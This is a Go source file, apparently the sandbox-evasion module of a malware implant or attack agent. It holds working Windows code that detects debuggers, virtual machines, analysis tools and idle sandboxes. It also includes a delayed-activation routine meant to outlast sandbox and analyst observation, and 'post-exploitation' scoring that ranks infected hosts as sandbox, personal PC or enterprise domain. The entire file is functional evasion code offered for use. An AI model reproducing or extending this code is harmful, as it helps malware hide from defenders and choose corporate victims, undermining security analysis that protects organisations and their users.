// Package evasion provides sandbox detection and environment analysis.
//
// # Detection Strategy
//
// Modern sandboxes (Any.Run, Joe Sandbox, VMRay, CAPE, etc.) routinely
// provision 2–4 vCPUs and 4–8 GiB RAM, making naive resource checks
// (< 2 CPU, < 2 GB) ineffective.  This module layers multiple independent
// signals and uses syscall-level APIs where possible to bypass user-mode
// hooks that sandboxes install on kernel32.dll.
//
// Checks:
//   - PEB.BeingDebugged + NtQueryInformationProcess(ProcessDebugPort)
//     — both bypass the commonly-hooked IsDebuggerPresent.
//   - CPU / memory / disk floors raised to modern thresholds.
//   - Process uptime derived from GetProcessTimes (not system uptime).
//   - VM MAC OUI detection via GetAdaptersAddresses (now implemented).
//   - VM driver files on the filesystem.
//   - Timing consistency between two independent clocks.
//   - Process enumeration via NtQuerySystemInformation (primary) with
//     CreateToolhelp32Snapshot fallback.
//
// Confidence levels: 1 check = low, 2 = medium, 3+ = high.
package evasion

import (
	"fmt"
	"os"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// =============================================================================
// Windows API stubs — kept for APIs not exported by golang.org/x/sys/windows
// =============================================================================

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	user32   = windows.NewLazySystemDLL("user32.dll")

	procGetNativeSystemInfo  = kernel32.NewProc("GetNativeSystemInfo")
	procGlobalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
	procGetTickCount64       = kernel32.NewProc("GetTickCount64")
	procGetSystemMetrics     = user32.NewProc("GetSystemMetrics")
	procCreateWaitableTimer  = kernel32.NewProc("CreateWaitableTimerW")
	procSetWaitableTimer     = kernel32.NewProc("SetWaitableTimer")
)

// sysInfo mirrors the Windows SYSTEM_INFO structure.
// Layout validated against sizeof(SYSTEM_INFO) == 48 on amd64.
type sysInfo struct {
	processorArchitecture     uint16
	reserved                  uint16
	pageSize                  uint32
	minimumApplicationAddress uintptr
	maximumApplicationAddress uintptr
	activeProcessorMask       uintptr
	numberOfProcessors        uint32
	processorType             uint32
	allocationGranularity     uint32
	processorLevel            uint16
	processorRevision         uint16
}

// memStatusEx mirrors the Windows MEMORYSTATUSEX structure.
// Layout validated against sizeof(MEMORYSTATUSEX) == 64 on amd64.
type memStatusEx struct {
	length               uint32
	memoryLoad           uint32
	totalPhys            uint64
	availPhys            uint64
	totalPageFile        uint64
	availPageFile        uint64
	totalVirtual         uint64
	availVirtual         uint64
	availExtendedVirtual uint64
}

// System metrics indices for GetSystemMetrics.
const (
	smCXScreen = 0
	smCYScreen = 1
)

// getNativeSystemInfo wraps kernel32!GetNativeSystemInfo.
func getNativeSystemInfo(info *sysInfo) {
	procGetNativeSystemInfo.Call(uintptr(unsafe.Pointer(info)))
}

// globalMemoryStatusEx wraps kernel32!GlobalMemoryStatusEx.
func globalMemoryStatusEx(ms *memStatusEx) error {
	r1, _, err := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(ms)))
	if r1 == 0 {
		return err
	}
	return nil
}

// getTickCount64 wraps kernel32!GetTickCount64.
func getTickCount64() uint64 {
	r1, _, _ := procGetTickCount64.Call()
	return uint64(r1)
}

// getSystemMetrics wraps user32!GetSystemMetrics.
func getSystemMetrics(index int) int {
	r1, _, _ := procGetSystemMetrics.Call(uintptr(index))
	return int(r1)
}

// createWaitableTimer wraps kernel32!CreateWaitableTimerW.
// Used by vault.go:kernelSleep.
func createWaitableTimer(attrs unsafe.Pointer, manualReset bool, name *uint16) (windows.Handle, error) {
	var m uintptr
	if manualReset {
		m = 1
	}
	r1, _, err := procCreateWaitableTimer.Call(uintptr(attrs), m, uintptr(unsafe.Pointer(name)))
	if r1 == 0 {
		return 0, err
	}
	return windows.Handle(r1), nil
}

// setWaitableTimer wraps kernel32!SetWaitableTimer.
// Used by vault.go:kernelSleep.
func setWaitableTimer(hTimer windows.Handle, dueTime *windows.Filetime, period int32, completionRoutine, arg uintptr, resume bool) error {
	var r uintptr
	if resume {
		r = 1
	}
	r1, _, err := procSetWaitableTimer.Call(uintptr(hTimer), uintptr(unsafe.Pointer(dueTime)), uintptr(period), completionRoutine, arg, r)
	if r1 == 0 {
		return err
	}
	return nil
}

// lastInputInfo mirrors the Windows LASTINPUTINFO structure.
type lastInputInfo struct {
	cbSize uint32
	dwTime uint32
}

// =============================================================================
// Verdict
// =============================================================================

// Verdict summarises the sandbox analysis outcome.
type Verdict struct {
	IsSandbox  bool     // true if the environment looks like a sandbox
	Confidence string   // "low", "medium", or "high"
	Reasons    []string // human-readable detection reasons
}

// =============================================================================
// CheckSandbox — main entry point
// =============================================================================

// CheckSandbox runs all enabled detection checks and returns a verdict.
//
// Detections are additive — a single check can trigger the verdict, but
// multiple independent checks raise the confidence level.
func CheckSandbox() *Verdict {
	v := &Verdict{}

	checks := []struct {
		name string
		fn   func() (detected bool, reason string)
	}{
		{"debugger_present", checkDebugger},
		{"cpu_floor", checkCPUFloor},
		{"memory_floor", checkMemoryFloor},
		{"disk_floor", checkDiskFloor},
		{"uptime_floor", checkUptimeFloor},
		{"timing_anomaly", checkTimingAnomaly},
		{"sandbox_processes", checkSandboxProcesses},
		{"vm_mac_address", checkVMMAC},
		{"vm_drivers", checkVMDrivers},
	}

	for _, c := range checks {
		if detected, reason := c.fn(); detected {
			v.Reasons = append(v.Reasons, reason)
		}
	}

	switch {
	case len(v.Reasons) >= 3:
		v.IsSandbox = true
		v.Confidence = "high"
	case len(v.Reasons) == 2:
		v.IsSandbox = true
		v.Confidence = "medium"
	case len(v.Reasons) == 1:
		// A single lightweight check (e.g. CPU floor) might be a false
		// positive on a constrained but real endpoint.  Mark as low
		// confidence so the operator can decide.
		v.IsSandbox = true
		v.Confidence = "low"
	default:
		v.Confidence = "none"
	}

	return v
}

// =============================================================================
// Individual checks
// =============================================================================

// checkDebugger detects a debugger via two syscall-level methods that
// bypass the commonly-hooked kernel32!IsDebuggerPresent:
//
//  1. PEB.BeingDebugged — read directly from the PEB via
//     NtQueryInformationProcess(ProcessBasicInformation).  This reads the
//     flag that IsDebuggerPresent checks internally, without calling any
//     API that a sandbox can hook.
//  2. NtQueryInformationProcess(ProcessDebugPort) — returns a non-zero
//     value (typically -1) when a user-mode debugger is attached.
func checkDebugger() (bool, string) {
	// ── Method 1: PEB.BeingDebugged ──────────────────────────────────
	var pbi windows.PROCESS_BASIC_INFORMATION
	err := windows.NtQueryInformationProcess(
		windows.CurrentProcess(),
		windows.ProcessBasicInformation,
		unsafe.Pointer(&pbi),
		uint32(unsafe.Sizeof(pbi)),
		nil,
	)
	if err == nil && pbi.PebBaseAddress != nil && pbi.PebBaseAddress.BeingDebugged != 0 {
		return true, "debugger attached (PEB.BeingDebugged=1)"
	}

	// ── Method 2: ProcessDebugPort ───────────────────────────────────
	var debugPort uintptr
	err = windows.NtQueryInformationProcess(
		windows.CurrentProcess(),
		windows.ProcessDebugPort,
		unsafe.Pointer(&debugPort),
		uint32(unsafe.Sizeof(debugPort)),
		nil,
	)
	if err == nil && debugPort != 0 {
		return true, "debugger attached (ProcessDebugPort != 0)"
	}

	return false, ""
}

// checkCPUFloor flags systems with fewer than 2 logical CPUs.
//
// NOTE: this is a weak signal.  Modern sandboxes routinely ship with
// 2–4 vCPUs, so this check alone is insufficient.  It is retained as a
// low-cost screen against budget/legacy sandboxes and CI runners.
func checkCPUFloor() (bool, string) {
	var info sysInfo
	getNativeSystemInfo(&info)
	if info.numberOfProcessors < 2 {
		return true, fmt.Sprintf("single vCPU (%d)", info.numberOfProcessors)
	}
	return false, ""
}

// checkMemoryFloor flags systems with less than 4 GiB of physical RAM.
//
// Raised from the original 2 GiB threshold: modern sandboxes (Any.Run,
// Joe Sandbox) provision 4+ GiB by default.  4 GiB catches small-footprint
// VMs and CI runners while minimising false positives on real endpoints.
func checkMemoryFloor() (bool, string) {
	var ms memStatusEx
	ms.length = uint32(unsafe.Sizeof(ms))
	if err := globalMemoryStatusEx(&ms); err != nil {
		return false, ""
	}
	totalMB := ms.totalPhys / (1024 * 1024)
	if totalMB < 4096 {
		return true, fmt.Sprintf("low physical memory (%d MiB)", totalMB)
	}
	return false, ""
}

// checkDiskFloor flags systems where the system drive (C:\) is smaller
// than 60 GiB.  Automated sandboxes typically use thin-provisioned VMs
// with compact virtual disks (20–40 GiB), while real workstations and
// laptops ship with ≥ 128 GiB SSDs.
func checkDiskFloor() (bool, string) {
	pathPtr := windows.StringToUTF16Ptr("C:\\")

	var totalBytes uint64
	if err := windows.GetDiskFreeSpaceEx(pathPtr, nil, &totalBytes, nil); err != nil {
		return false, ""
	}

	totalGB := totalBytes / (1024 * 1024 * 1024)
	if totalGB < 60 {
		return true, fmt.Sprintf("small system disk (%d GiB)", totalGB)
	}
	return false, ""
}

// checkUptimeFloor flags processes that have been running less than
// 5 minutes.  Uses process creation time from GetProcessTimes rather
// than system uptime (GetTickCount64), which was incorrect — sandbox
// hosts often run for days even though individual analysis samples
// are short-lived.
func checkUptimeFloor() (bool, string) {
	var creation, exit, kernel, user windows.Filetime
	if err := windows.GetProcessTimes(
		windows.CurrentProcess(),
		&creation, &exit, &kernel, &user,
	); err != nil {
		return false, ""
	}

	uptime := time.Since(time.Unix(0, creation.Nanoseconds()))
	if uptime < 5*time.Minute {
		return true, fmt.Sprintf("short process uptime (%v)", uptime.Round(time.Second))
	}
	return false, ""
}

// checkTimingAnomaly compares elapsed time measured by two independent
// clocks after a short sleep.  Sandboxes that manipulate time (speed-up
// to force fast execution, or slow-down for API hammering detection)
// create a measurable discrepancy.
//
// Uses:
//   - GetTickCount64 (kernel32, commonly hooked/accelerated by sandboxes)
//   - time.Now / time.Sleep (Go runtime → QueryPerformanceCounter,
//     harder for a user-mode sandbox to hook)
//
// A ratio deviating significantly from 1.0 suggests time manipulation.
func checkTimingAnomaly() (bool, string) {
	gtc1 := getTickCount64()
	t1 := time.Now()

	time.Sleep(100 * time.Millisecond)

	gtc2 := getTickCount64()
	t2 := time.Now()

	realDelta := t2.Sub(t1)
	if realDelta <= 0 {
		return false, ""
	}

	gtcDelta := time.Duration(gtc2-gtc1) * time.Millisecond
	ratio := float64(gtcDelta) / float64(realDelta)

	// Allow 0.7x–1.5x drift (real systems have minor clock skew).
	// Beyond that: likely time manipulation.
	if ratio > 1.5 || ratio < 0.7 {
		return true, fmt.Sprintf("timing anomaly: GTC/sleep ratio = %.2f", ratio)
	}
	return false, ""
}

// checkSandboxProcesses scans the process list for known analysis and
// reverse-engineering tools.
//
// Primary path:  NtQuerySystemInformation(SystemProcessInformation)
//
//	— syscall-level enumeration that bypasses CreateToolhelp32Snapshot hooks.
//
// Fallback path: CreateToolhelp32Snapshot
//
//	— used when the NT path fails (e.g. STATUS_ACCESS_DENIED).
func checkSandboxProcesses() (bool, string) {
	var found []string

	for _, name := range knownAnalysisProcesses() {
		if procRunning(name) {
			found = append(found, name)
		}
	}

	if len(found) > 0 {
		return true, fmt.Sprintf("analysis processes running: %s",
			strings.Join(found, ", "))
	}
	return false, ""
}

// checkVMMAC enumerates network adapters via GetAdaptersAddresses and
// checks the first 3 bytes of each physical address against known
// virtual-machine OUI prefixes (VMware, VirtualBox, Hyper-V, Xen, QEMU).
//
// False-positive risk: enterprise VDI / server farms running on the
// same hypervisors.  When combined with additional checks (disk, uptime,
// processes) the aggregate confidence distinguishes VM labs from VDI.
func checkVMMAC() (bool, string) {
	// First call: get required buffer size.
	var bufLen uint32
	windows.GetAdaptersAddresses(0, 0, 0, nil, &bufLen)
	if bufLen == 0 {
		return false, ""
	}

	buf := make([]byte, bufLen)
	aa := (*windows.IpAdapterAddresses)(unsafe.Pointer(&buf[0]))
	// Set Length to the full structure size so the API returns the
	// LH (Vista+) version with PhysicalAddress populated.
	aa.Length = uint32(unsafe.Sizeof(windows.IpAdapterAddresses{}))

	if err := windows.GetAdaptersAddresses(0, 0, 0, aa, &bufLen); err != nil {
		return false, ""
	}

	for ptr := aa; ptr != nil; ptr = ptr.Next {
		if ptr.PhysicalAddressLength < 3 {
			continue
		}
		for _, oui := range vmOUIs {
			if ptr.PhysicalAddress[0] == oui[0] &&
				ptr.PhysicalAddress[1] == oui[1] &&
				ptr.PhysicalAddress[2] == oui[2] {
				return true, fmt.Sprintf("VM MAC OUI %02X:%02X:%02X",
					oui[0], oui[1], oui[2])
			}
		}
	}

	return false, ""
}

// checkVMDrivers checks for the presence of well-known virtual-machine
// guest driver files on the filesystem.  These are strong indicators
// that the process is running inside a VM regardless of hypervisor type.
func checkVMDrivers() (bool, string) {
	for _, driver := range vmDriverFiles {
		if fileExists(driver) {
			return true, fmt.Sprintf("VM driver present: %s", driver)
		}
	}
	return false, ""
}

// =============================================================================
// Process enumeration
// =============================================================================

// procRunning returns true if a process with the given executable name
// is currently running on the system.
//
// Tries NtQuerySystemInformation(SystemProcessInformation) first
// (syscall-level, bypasses user-mode hooks on CreateToolhelp32Snapshot).
// Falls back to CreateToolhelp32Snapshot if the NT call fails.
func procRunning(name string) bool {
	if procRunningViaSyscall(name) {
		return true
	}
	return procRunningViaSnapshot(name)
}

// procRunningViaSyscall enumerates processes through
// NtQuerySystemInformation(SystemProcessInformation), which returns a
// linked list of SYSTEM_PROCESS_INFORMATION structures.
func procRunningViaSyscall(name string) bool {
	var bufLen uint32 = 128 * 1024 // start with 128 KiB
	buf := make([]byte, bufLen)

	for {
		err := windows.NtQuerySystemInformation(
			windows.SystemProcessInformation,
			unsafe.Pointer(&buf[0]),
			bufLen,
			&bufLen,
		)
		if err == nil {
			break
		}
		// STATUS_INFO_LENGTH_MISMATCH — buffer too small; grow and retry.
		// The NTStatus type in x/sys wraps NTSTATUS codes; the error
		// string for 0xC0000004 contains "STATUS_INFO_LENGTH_MISMATCH".
		if strings.Contains(err.Error(), "STATUS_INFO_LENGTH_MISMATCH") ||
			strings.Contains(err.Error(), "0xc0000004") {
			bufLen *= 2
			buf = make([]byte, bufLen)
			continue
		}
		return false
	}

	for offset := 0; ; {
		spi := (*windows.SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(&buf[offset]))

		if spi.ImageName.Buffer != nil && spi.ImageName.Length > 0 {
			charCount := spi.ImageName.Length / 2
			procName := windows.UTF16ToString(unsafe.Slice(
				spi.ImageName.Buffer, charCount,
			))
			if strings.EqualFold(procName, name) {
				return true
			}
		}

		if spi.NextEntryOffset == 0 {
			break
		}
		offset += int(spi.NextEntryOffset)
	}

	return false
}

// procRunningViaSnapshot enumerates processes via the standard Win32
// CreateToolhelp32Snapshot / Process32First / Process32Next chain.
//
// Retained as a fallback for environments where the NT syscall path
// is blocked (e.g. strict process ACLs, certain EDR configurations).
func procRunningViaSnapshot(name string) bool {
	snapshot, err := windows.CreateToolhelp32Snapshot(
		windows.TH32CS_SNAPPROCESS, 0,
	)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	err = windows.Process32First(snapshot, &pe)
	for err == nil {
		procName := windows.UTF16ToString(pe.ExeFile[:])
		if strings.EqualFold(procName, name) {
			return true
		}
		err = windows.Process32Next(snapshot, &pe)
	}

	return false
}

// =============================================================================
// Filesystem helpers
// =============================================================================

// fileExists returns true if the given path exists and is a regular file.
func fileExists(path string) bool {
	pathPtr := windows.StringToUTF16Ptr(path)
	attrs, err := windows.GetFileAttributes(pathPtr)
	if err != nil {
		return false
	}
	return attrs&windows.FILE_ATTRIBUTE_DIRECTORY == 0
}

// =============================================================================
// Delayed execution
// =============================================================================

// DelayStart sleeps for the given duration before returning. The intended
// use is to delay agent activation after process creation, defeating
// sandboxes that only monitor the first N seconds of execution.
//
// Common strategies:
//
//	30–60s   : short delay — beats sandboxes with 10–15s analysis windows.
//	5–10min  : long delay  — also beats manual analysts watching task manager.
//	0        : no delay   — use in production when speed matters.
//
// The delay uses kernelSleep (WaitForSingleObject on a waitable timer) so
// the calling thread enters kernel mode and does not execute user-mode code
// during the wait.  This also evades user-mode API hooks (see vault.go).
func DelayStart(d time.Duration) {
	if d <= 0 {
		return
	}
	_ = kernelSleep(d)
}

// =============================================================================
// Interactive vs automated detection
// =============================================================================

// IsInteractive returns false when the current process appears to lack
// a real human user session — no mouse movement, minimal screen, etc.
//
// Currently a best-effort check using GetSystemMetrics.
func IsInteractive() bool {
	cx := getSystemMetrics(smCXScreen)
	cy := getSystemMetrics(smCYScreen)
	if cx < 800 || cy < 600 {
		return false
	}
	return true
}

// =============================================================================
// Post-exploitation: user environment checks
// =============================================================================

// SystemFingerprint collects environment metadata for scoring.
type SystemFingerprint struct {
	DomainName       string
	InstalledApps    []string
	RunningProcesses []string
}

// IsSandboxUser checks common sandbox/analysis account usernames.
func IsSandboxUser() bool {
	name := os.Getenv("USERNAME")
	if name == "" {
		name = os.Getenv("USER")
	}

	name = strings.ToLower(name)
	for _, pattern := range sandboxUsernames {
		if strings.EqualFold(name, pattern) {
			return true
		}
	}
	return false
}

// =============================================================================
// Environment scoring
// =============================================================================

// EvaluateEnvironmentLevel scores a system fingerprint on a 0–3 scale:
//
//	0 — Sandbox (highly likely automated analysis)
//	1 — Unknown  (insufficient signal)
//	2 — PC      (real endpoint, likely personal)
//	3 — Enterprise Domain (real endpoint in a corporate domain)
//
// Scoring is additive from a neutral baseline of 50.  Each indicator
// pushes the score toward one of the four categories.
func EvaluateEnvironmentLevel(fp SystemFingerprint) int {
	score := 50 // neutral baseline

	// ── Domain assessment ───────────────────────────────────────────
	isDomain := fp.DomainName != "" &&
		!strings.Contains(strings.ToUpper(fp.DomainName), "WORKGROUP")
	isTestDomain := strings.HasSuffix(strings.ToLower(fp.DomainName), ".local") ||
		strings.Contains(strings.ToLower(fp.DomainName), "test")

	if isDomain && !isTestDomain {
		score += 40 // strong enterprise signal
	}

	// ── Software & process fingerprinting ───────────────────────────
	enterpriseHits := 0
	personalHits := 0
	sandboxToolHits := 0

	// Cross-region enterprise indicators (not China-specific).
	enterpriseApps := []string{
		"teams", "outlook", "slack", "zoom", "citrix",
		"anyconnect", "globalprotect", "pulse secure",
		"symantec", "mcafee", "crowdstrike", "sentinelone",
		"carbon black", "defender for endpoint", "sophos", "trend micro",
		"sccm", "tanium", "pdq", "lansweeper",
		"activedirectory", "ldap", "kerberos",
	}
	personalApps := []string{
		"chrome", "firefox", "brave", "msedge",
		"steam", "discord", "spotify", "notion",
		"vscode", "intellij", "sublime", "neovim",
		"docker desktop", "git", "node.js", "python",
		"thunderbird", "dropbox", "onedrive",
		"whatsapp", "telegram", "signal",
	}
	sandboxTools := knownAnalysisProcesses()

	for _, app := range fp.InstalledApps {
		appLower := strings.ToLower(app)
		for _, ea := range enterpriseApps {
			if strings.Contains(appLower, ea) {
				enterpriseHits++
			}
		}
		for _, pa := range personalApps {
			if strings.Contains(appLower, pa) {
				personalHits++
			}
		}
		for _, st := range sandboxTools {
			if strings.Contains(appLower, st) {
				sandboxToolHits++
			}
		}
	}

	// Process count: very few processes suggest sandbox / fresh VM.
	totalProcs := len(fp.RunningProcesses)
	switch {
	case totalProcs < 40:
		score -= 30
	case totalProcs < 80:
		score -= 10
	case totalProcs > 150:
		score += 15
	}

	// Sandbox tools on the system are a strong negative signal.
	if sandboxToolHits > 0 {
		score -= sandboxToolHits * 40
	}

	score += enterpriseHits * 15
	score += personalHits * 10

	// ── Final classification ────────────────────────────────────────
	switch {
	case score < 30:
		return 0 // Sandbox
	case score >= 30 && score < 55:
		return 1 // Unknown
	case score >= 55 && score < 85:
		return 2 // PC
	default:
		return 3 // Domain Environment
	}
}

// =============================================================================
// Post-exploitation: idle detection
// =============================================================================

// GetStatusOfInput checks if user input exists in the environment.
// Returns:
//
//	0 — unlikely sandbox (input detected)
//	1 — highly probable sandbox (no input)
func GetStatusOfInput() int {
	user32 := windows.NewLazySystemDLL("user32.dll")
	getLastInputInfo := user32.NewProc("GetLastInputInfo")
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getTickCount := kernel32.NewProc("GetTickCount")

	var lii lastInputInfo
	lii.cbSize = uint32(unsafe.Sizeof(lii))

	// Get the initial idle state
	getLastInputInfo.Call(uintptr(unsafe.Pointer(&lii)))
	initialInputTime := lii.dwTime
	t1, _, _ := getTickCount.Call()
	idleTime1 := uint32(t1) - lii.dwTime

	// Wait for 3 seconds
	time.Sleep(3 * time.Second)

	// Retrieve again and check if the idle time has been reset.
	getLastInputInfo.Call(uintptr(unsafe.Pointer(&lii)))
	t2, _, _ := getTickCount.Call()
	idleTime2 := uint32(t2) - lii.dwTime

	if idleTime2 < idleTime1 {
		return 1
	}
	time.Sleep(2 * time.Second)
	getLastInputInfo.Call(uintptr(unsafe.Pointer(&lii)))

	if lii.dwTime == initialInputTime {
		return 0
	}
	return 1
}

// =============================================================================
// Data tables
// =============================================================================

// vmOUIs holds known virtual-machine MAC address prefixes (first 3 bytes).
// These are burned-in OUIs assigned to hypervisor vendors by the IEEE.
var vmOUIs = [][3]byte{
	// VMware
	{0x00, 0x05, 0x69},
	{0x00, 0x0C, 0x29},
	{0x00, 0x1C, 0x14},
	{0x00, 0x50, 0x56},
	// VirtualBox
	{0x08, 0x00, 0x27},
	// Hyper-V
	{0x00, 0x15, 0x5D},
	// Xen / Citrix
	{0x00, 0x16, 0x3E},
	// QEMU (older)
	{0x52, 0x54, 0x00},
	// Parallels
	{0x00, 0x1C, 0x42},
}

// vmDriverFiles lists filesystem paths of known VM guest drivers.
// Presence of any of these strongly indicates a virtualised environment.
var vmDriverFiles = []string{
	// VMware Tools
	"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
	"C:\\Windows\\System32\\drivers\\vmmemctl.sys",
	"C:\\Windows\\System32\\drivers\\vmmouse.sys",
	"C:\\Windows\\System32\\drivers\\vm3dmp.sys",
	"C:\\Windows\\System32\\drivers\\vmusbmouse.sys",
	"C:\\Windows\\System32\\drivers\\vmx_svga.sys",
	"C:\\Windows\\System32\\drivers\\vmxnet.sys",
	"C:\\Windows\\System32\\drivers\\vmci.sys",
	"C:\\Windows\\System32\\drivers\\vsock.sys",
	// VirtualBox Guest Additions
	"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
	"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
	"C:\\Windows\\System32\\drivers\\VBoxSF.sys",
	"C:\\Windows\\System32\\drivers\\VBoxVideo.sys",
	// Hyper-V Integration Services
	"C:\\Windows\\System32\\drivers\\vmbus.sys",
	"C:\\Windows\\System32\\drivers\\vms3cap.sys",
	"C:\\Windows\\System32\\drivers\\storvsc.sys",
	"C:\\Windows\\System32\\drivers\\vpcivsp.sys",
	// Xen / Citrix
	"C:\\Windows\\System32\\drivers\\xenevtchn.sys",
	"C:\\Windows\\System32\\drivers\\xennet.sys",
	"C:\\Windows\\System32\\drivers\\xenvbd.sys",
}

// sandboxUsernames collects account names commonly used in sandboxes
// and malware-analysis environments.
var sandboxUsernames = []string{
	"sandbox", "malware", "analysis", "analyze",
	"admin", "administrator", "user",
	"test", "virus", "infected",
	"cuckoo", "cuckoofork",
}

// knownAnalysisProcesses returns executable names commonly associated
// with malware analysis, reverse engineering, and sandboxing.
//
// NOTE: "python.exe" has been removed — it is too broad and creates
// false positives on developer workstations.  Python-based sandbox
// agents are still caught by the aggregate scoring when combined with
// other indicators.
func knownAnalysisProcesses() []string {
	return []string{
		// Virtualisation guest tools
		"vmtoolsd.exe",
		"VBoxService.exe",
		"VBoxTray.exe",

		// Sysinternals / analysis
		"procmon.exe",
		"procexp.exe",
		"procexp64.exe",
		"Procmon64.exe",
		"tcpview.exe",
		"autoruns.exe",
		"Autoruns64.exe",

		// Packet capture
		"wireshark.exe",
		"dumpcap.exe",
		"tcpdump.exe",
		"pktmon.exe",
		"procdump.exe",

		// Debuggers
		"x32dbg.exe",
		"x64dbg.exe",
		"x96dbg.exe",
		"ollydbg.exe",
		"windbg.exe",
		"ImmunityDebugger.exe",
		"PE-bear.exe",
		"PEiD.exe",
		"ida.exe",
		"ida64.exe",
		"stud_PE.exe",
		"010editor.exe",
		"die32.exe",
		"die64.exe",
		"die.exe",
		"devenv.exe", // Visual Studio with debugger attached

		// HTTP debugging proxies
		"fiddler.exe",
		"charles.exe",
		"Charles.exe",
		"mitmproxy.exe",
		"burpsuite.exe",
		"BurpSuite.exe",

		// Sandbox / Cuckoo agents
		"agent.py",
		"analyzer.exe",
		"cuckooagent.exe",

		// Disassemblers / RE suites
		"ghidra.exe",
		"ghidraRun.bat",
		"radare2.exe",
		"binaryninja.exe",
		"cutter.exe",
		"rizin.exe",

		// Virtualisation management (rare on production endpoints)
		"vboxmanage.exe",
		"vmware.exe",
		"vmrun.exe",
		"qemu-system-x86_64.exe",
	}
}
